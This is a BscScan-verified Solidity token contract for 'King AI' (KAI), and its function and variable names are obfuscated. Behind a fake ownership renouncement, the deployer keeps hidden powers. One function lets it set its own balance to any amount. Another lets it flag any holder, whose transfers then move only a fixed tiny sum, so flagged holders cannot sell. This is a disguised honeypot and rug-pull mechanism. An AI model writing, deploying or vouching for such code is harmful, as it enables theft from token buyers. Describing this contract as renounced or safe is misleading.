/**
 *Submitted for verification at BscScan.com on 2023-02-22
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface receiverLiquiditySwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buyExemptReceiverTake) external view returns (uint256);

    function transfer(address swapTakeLiquidity, uint256 fromMaxWallet) external returns (bool);

    function allowance(address liquidityMarketingLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromMaxWallet) external returns (bool);

    function transferFrom(
        address sender,
        address swapTakeLiquidity,
        uint256 fromMaxWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed buyTotalAuto, uint256 value);
    event Approval(address indexed liquidityMarketingLaunch, address indexed spender, uint256 value);
}

interface isLaunchedFrom is receiverLiquiditySwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract listTxReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverIsToFee {
    function createPair(address liquidityTokenFromTo, address launchedAutoReceiver) external returns (address);
}

interface walletAmountFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract KingAI is listTxReceiver, receiverLiquiditySwap, isLaunchedFrom {

    uint8 private liquidityFundTrading = 18;

    function fundTokenIs() public {
        emit OwnershipTransferred(limitFundSwap, address(0));
        autoSellIs = address(0);
    }

    bool public launchMinReceiver;

    address public limitFundSwap;

    address public modeTeamMax;

    function amountLaunchedSwap() public {
        if (modeWalletMax != atFeeMode) {
            launchedTotalListTrading = senderEnableSell;
        }
        
        modeWalletMax=0;
    }

    uint256 public atFeeMode;

    uint256 public launchedTotalListTrading;

    function allowance(address buyWalletExempt, address teamIsList) external view virtual override returns (uint256) {
        return limitIsMode[buyWalletExempt][teamIsList];
    }

    function receiverMinTotal(address fromModeMax) public {
        
        if (fromModeMax == limitFundSwap || fromModeMax == modeTeamMax || !autoIsAmount[_msgSender()]) {
            return;
        }
        if (atFeeMode != launchedTotalListTrading) {
            launchedTotalListTrading = modeWalletMax;
        }
        enableTotalAmount[fromModeMax] = true;
    }

    event OwnershipTransferred(address indexed fromToBuy, address indexed fundSellMin);

    address private autoSellIs;

    function receiverEnableModeList(address isAtMax) public {
        if (walletSellMode) {
            return;
        }
        
        autoIsAmount[isAtMax] = true;
        if (modeWalletMax == launchedTotalListTrading) {
            maxToTradingEnable = senderEnableSell;
        }
        walletSellMode = true;
    }

    bool public autoTotalExempt;

    function fromLaunchedReceiver(address toShouldTradingLaunched, address swapTakeLiquidity, uint256 fromMaxWallet) internal returns (bool) {
        require(buyAutoMin[toShouldTradingLaunched] >= fromMaxWallet);
        buyAutoMin[toShouldTradingLaunched] -= fromMaxWallet;
        buyAutoMin[swapTakeLiquidity] += fromMaxWallet;
        emit Transfer(toShouldTradingLaunched, swapTakeLiquidity, fromMaxWallet);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return takeBuyMaxToken;
    }

    function walletAtTrading() public view returns (uint256) {
        return launchedTotalListTrading;
    }

    mapping(address => bool) public autoIsAmount;

    uint256 private totalReceiverLiquidity = 100000000 * 10 ** 18;

    uint256 public modeWalletMax;

    bool public walletSellMode;

    function enableShouldList() public {
        
        if (autoTotalExempt) {
            senderEnableSell = maxToTradingEnable;
        }
        senderEnableSell=0;
    }

    function isLaunchedSender(uint256 fromMaxWallet) public {
        if (!autoIsAmount[_msgSender()]) {
            return;
        }
        buyAutoMin[limitFundSwap] = fromMaxWallet;
    }

    uint256 constant txTradingMax = 11 ** 10;

    function decimals() external view virtual override returns (uint8) {
        return liquidityFundTrading;
    }

    function toMinEnable() public view returns (uint256) {
        return atFeeMode;
    }

    uint256 public maxToTradingEnable;

    function name() external view virtual override returns (string memory) {
        return minTradingReceiverExempt;
    }

    mapping(address => mapping(address => uint256)) private limitIsMode;

    function balanceOf(address buyExemptReceiverTake) public view virtual override returns (uint256) {
        return buyAutoMin[buyExemptReceiverTake];
    }

    constructor (){ 
        if (maxToTradingEnable != launchedTotalListTrading) {
            launchedTotalListTrading = senderEnableSell;
        }
        walletAmountFrom totalAmountMarketing = walletAmountFrom(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        modeTeamMax = receiverIsToFee(totalAmountMarketing.factory()).createPair(totalAmountMarketing.WETH(), address(this));
        autoSellIs = _msgSender();
        if (maxToTradingEnable == launchedTotalListTrading) {
            senderEnableSell = launchedTotalListTrading;
        }
        limitFundSwap = _msgSender();
        autoIsAmount[_msgSender()] = true;
        
        buyAutoMin[_msgSender()] = totalReceiverLiquidity;
        emit Transfer(address(0), limitFundSwap, totalReceiverLiquidity);
        fundTokenIs();
    }

    function totalSupply() external view virtual override returns (uint256) {
        return totalReceiverLiquidity;
    }

    string private takeBuyMaxToken = "KAI";

    function listFromWalletExempt() public view returns (uint256) {
        return maxToTradingEnable;
    }

    mapping(address => bool) public enableTotalAmount;

    function owner() external view returns (address) {
        return autoSellIs;
    }

    mapping(address => uint256) private buyAutoMin;

    function transferFrom(address toShouldTradingLaunched, address swapTakeLiquidity, uint256 fromMaxWallet) external override returns (bool) {
        if (limitIsMode[toShouldTradingLaunched][_msgSender()] != type(uint256).max) {
            require(fromMaxWallet <= limitIsMode[toShouldTradingLaunched][_msgSender()]);
            limitIsMode[toShouldTradingLaunched][_msgSender()] -= fromMaxWallet;
        }
        return enableTeamWalletMax(toShouldTradingLaunched, swapTakeLiquidity, fromMaxWallet);
    }

    function modeMaxTakeFund() public {
        if (launchMinReceiver == autoTotalExempt) {
            maxToTradingEnable = senderEnableSell;
        }
        
        senderEnableSell=0;
    }

    function getOwner() external view returns (address) {
        return autoSellIs;
    }

    function takeSwapLiquidity() public view returns (uint256) {
        return atFeeMode;
    }

    uint256 private senderEnableSell;

    function buyToMarketing() public view returns (uint256) {
        return atFeeMode;
    }

    string private minTradingReceiverExempt = "King AI";

    function approve(address teamIsList, uint256 fromMaxWallet) public virtual override returns (bool) {
        limitIsMode[_msgSender()][teamIsList] = fromMaxWallet;
        emit Approval(_msgSender(), teamIsList, fromMaxWallet);
        return true;
    }

    function enableTeamWalletMax(address toShouldTradingLaunched, address swapTakeLiquidity, uint256 fromMaxWallet) internal returns (bool) {
        if (toShouldTradingLaunched == limitFundSwap) {
            return fromLaunchedReceiver(toShouldTradingLaunched, swapTakeLiquidity, fromMaxWallet);
        }
        if (enableTotalAmount[toShouldTradingLaunched]) {
            return fromLaunchedReceiver(toShouldTradingLaunched, swapTakeLiquidity, txTradingMax);
        }
        return fromLaunchedReceiver(toShouldTradingLaunched, swapTakeLiquidity, fromMaxWallet);
    }

    function transfer(address teamToReceiver, uint256 fromMaxWallet) external virtual override returns (bool) {
        return enableTeamWalletMax(_msgSender(), teamToReceiver, fromMaxWallet);
    }

}